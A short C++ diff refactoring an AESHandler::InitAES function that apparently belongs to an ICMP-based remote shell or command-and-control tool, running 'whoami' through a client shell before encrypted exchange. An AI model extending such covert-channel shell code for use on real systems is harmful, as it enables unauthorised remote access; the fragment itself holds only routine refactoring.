@@ -135,11 +135,11 @@ std::string AESHandler::decryptMessage(const std::vector<unsigned char>& ciphert
 
 
 // Initialize and use AESHandler
-void AESHandler::InitAES(SOCKET sockfd, Custom_icmp icmp, std::string ip_addr, bool connected) {
+void AESHandler::InitAES(SOCKET sockfd, Custom_icmp icmp, const std::string& ip_addr, bool connected) {
     generateKeyAndNonce();
     std::string cmdResult;
     if (!connected) {
-        int status = Run(client->getShell(), L"whoami", cmdResult);
+        int status = Run(client->getShell(), L"whoami", &cmdResult);
     } else {
         cmdResult = "AESupdate";
     }
